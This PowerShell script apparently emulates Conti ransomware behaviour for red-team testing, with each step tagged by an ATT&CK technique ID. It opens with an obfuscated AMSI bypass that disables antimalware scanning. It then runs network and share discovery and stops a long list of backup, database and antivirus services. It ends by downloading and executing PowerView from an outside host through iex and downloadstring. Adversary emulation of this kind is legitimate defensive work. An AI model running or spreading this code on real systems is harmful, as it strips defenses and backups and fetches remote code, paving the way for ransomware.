[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65+47-47)+[ChAR]([byte]0x6d)+[CHAr]([bYtE]0x73)+[ChAR](105*46/46)+[Char](55+30)+[cHar]([byte]0x74)+[chaR]([ByTE]0x69)+[char]([BYTe]0x6c)+[CHAR]([bytE]0x73))").GetField($([cHar](97)+[chaR](109)+[Char]([bYTE]0x73)+[ChAr](105+103-103)+[CHaR](38+35)+[char](87+23)+[CHAr](105+71-71)+[chAr]([bytE]0x74)+[cHAr](70)+[CHAr](97*75/75)+[chAR]([BYtE]0x69)+[CHAR]([BYte]0x6c)+[chAr]([BytE]0x65)+[CHaR]([BYtE]0x64)),"NonPublic,Static").SetValue($null,$true);
# Adding content to shared storage locations
# Conti not only encrypts the files on the infected host but also spreads via SMB and encrypts files on different hosts, potentially compromising the entire network
# Requires elevation: False

# Attack
Write-Host "Emulate the encryption of files stored on a remote share"
Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1080] Add content to shared storage locations"


# System Network Configuration Discovery
# Requires elevation: False

# Attack

ipconfig /all
netsh interface show interface
arp -a
nbtstat -n
net config

Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1016] System Network Configuration Discovery"


# Windows command line - Create and execute batch script
# Requires Elevation: False

#Variables
$to_execute = '"cmd.exe" /C whoami'
$script_path = "T1059.003_script.bat"

# Prereqs
New-Item $script_path -Force | Out-Null
Set-Content -Path $script_path -Value $to_execute
Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1059.003] Created batch script"



# Attack
.\T1059.003_script.bat

# Cleanup 
Remove-Item $script_path -Force -ErrorAction Ignore
Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1059.003] Removed batch script"

$services = "Acronis VSS Provider","AcronisAgent"," AcrSch2Svc"," Antivirus"," ARSM"," AVP"," BackupExecAgentAccelerator"," BackupExecAgentBrowser"," BackupExecDeviceMediaService"," BackupExecJobEngine"," BackupExecManagementService"," BackupExecRPCService"," BackupExecVSSProvider"," bedbg"," DCAgent"," EhttpSrv"," ekrn"," Enterprise Client Service"," EPSecurityService"," EPUpdateService"," EraserSvc11710"," EsgShKernel"," ESHASRV"," FA_Scheduler"," IISAdmin"," IMAP4Svc"," klnagent"," McShield"," McTaskManager"," mfefire"," mfemms"," mfevtp"," MMS"," mozyprobackup"," MsDtsServer"," MsDtsServer100"," MsDtsServer110"," MSExchangeES"," MSExchangeIS"," MSExchangeMGMT"," MSExchangeMTA"," MSExchangeSA"," MSExchangeSRS"," msftesql`$PROD"," MSOLAP`$SQL_2008"," MSOLAP`$SYSTEM_BGC"," MSOLAP`$TPS"," MSOLAP`$TPSAMA"," MSSQL`$BKUPEXEC"," MSSQL`$ECWDB2"," MSSQL`$PRACTICEMGT"," MSSQL`$PRACTTICEBGC"," MSSQL`$PROD"," MSSQL`$PROFXENGAGEMENT"," MSSQL`$SBSMONITORING"," MSSQL`$SHAREPOINT"," MSSQL`$SOPHOS"," MSSQL`$SQL_2008"," MSSQL`$SQLEXPRESS"," MSSQL`$SYSTEM_BGC"," MSSQL`$TPS"," MSSQL`$TPSAMA"," MSSQL`$VEEAMSQL2008R2"," MSSQL`$VEEAMSQL2008R2"," MSSQL`$VEEAMSQL2012"," MSSQLFDLauncher"," MSSQLFDLauncher`$PROFXENGAGEMENT"," MSSQLFDLauncher`$SBSMONITORING"," MSSQLFDLauncher`$SHAREPOINT"," MSSQLFDLauncher`$SQL_2008"," MSSQLFDLauncher`$SYSTEM_BGC"," MSSQLFDLauncher`$TPS"," MSSQLFDLauncher`$TPSAMA"," MSSQLSERVER"," MSSQLServerADHelper"," MSSQLServerADHelper100"," MSSQLServerOLAPService"," MySQL57"," NetMsmqActivator"," ntrtscan"," OracleClientCache80"," PDVFSService"," POP3Svc"," ReportServer"," ReportServer`$SQL_2008"," ReportServer`$SYSTEM_BGC"," ReportServer`$TPS"," ReportServer`$TPSAMA"," RESvc"," sacsvr"," SamSs"," SAVAdminService"," SAVService"," SDRSVC"," SepMasterService"," ShMonitor"," Smcinst"," SmcService"," SMTPSvc"," SQL Backups"," SQLAgent`$BKUPEXEC"," SQLAgent`$CITRIX_METAFRAME"," SQLAgent`$CXDB"," SQLAgent`$ECWDB2"," SQLAgent`$PRACTTICEBGC"," SQLAgent`$PRACTTICEMGT"," SQLAgent`$PROD"," SQLAgent`$PROFXENGAGEMENT"," SQLAgent`$SBSMONITORING"," SQLAgent`$SHAREPOINT"," SQLAgent`$SOPHOS"," SQLAgent`$SQL_2008"," SQLAgent`$SQLEXPRESS"," SQLAgent`$SYSTEM_BGC"," SQLAgent`$TPS"," SQLAgent`$TPSAMA"," SQLAgent`$VEEAMSQL2008R2"," SQLAgent`$VEEAMSQL2008R2"," SQLAgent`$VEEAMSQL2012"," SQLBrowser"," SQLsafe Backup Service"," SQLsafe Filter Service"," SQLSafeOLRService"," SQLSERVERAGENT"," SQLTELEMETRY"," SQLTELEMETRY`$ECWDB2"," SQLWriter"," swi_update"," Veeam Backup Catalog Data Service"," VeeamBackupSvc"," VeeamBrokerSvc"," VeeamCatalogSvc"," VeeamCloudSvc"," VeeamDeploymentService"," VeeamDeploySvc"," VeeamEnterpriseManagerSvc"," VeeamHvIntegrationSvc"," VeeamMountSvc"," VeeamNFSSvc"," VeeamRESTSvc"," VeeamTransportSvc"," W3Svc"," wbengine"," wbengine"," WRSVC"," Zoolz 2 Service"

foreach($service in $services){net stop $service}


# :: Windows command line tests
# :: Requires Elevation: False

# :: Attack A - whoami
# "cmd.exe" /C whoami

# :: Attack B - write text to file and display, emulating dropping malicious file to disk.
# echo "Success" > "%cd%\test.bin" & type "%cd%\test.bin"
# PAUSE

# :: Cleanup B 
# del "%cd%\test.bin"


# Windows command line - Create and execute batch script
# Requires Elevation: False

# Attack - Find or discover files on the file system. Upon execution, file and folder information will be displayed.
ls -recurse
get-childitem -recurse
gci -recurse
Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1083] Display system information"

# Powershell is used to retrieve objects that represent the Server Message Block (SMB) shares being displayed by the computer
# Requires elevation: False

get-smbshare
Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1135] Enumerate local smb share on computer"

# Powershell is used to execute the PowerView script to enumerate share access
# Requires elevation: False
iex(new-object net.webclient).downloadstring("https://download.powerperks.ca/PowerView.ps1"); Find-DomainShare -CheckShareAccess -Verbose
Write-Output "[$(Get-Date -UFormat '%m/%d/%Y %R:%S')] [T1135] Enumerate domain share acces using PowerView"
